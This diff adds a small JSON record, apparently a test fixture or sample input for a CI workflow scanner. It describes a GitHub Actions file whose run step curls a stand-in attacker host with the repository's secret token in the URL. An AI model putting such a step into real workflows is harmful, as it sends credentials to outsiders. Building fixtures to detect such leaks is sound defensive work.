@@ -1,0 +1,5 @@
+{
+  "kind": "workflow",
+  "path": ".github/workflows/a.yml",
+  "text": "run: curl https://evil.example/${{ secrets.TOKEN }}"
+}
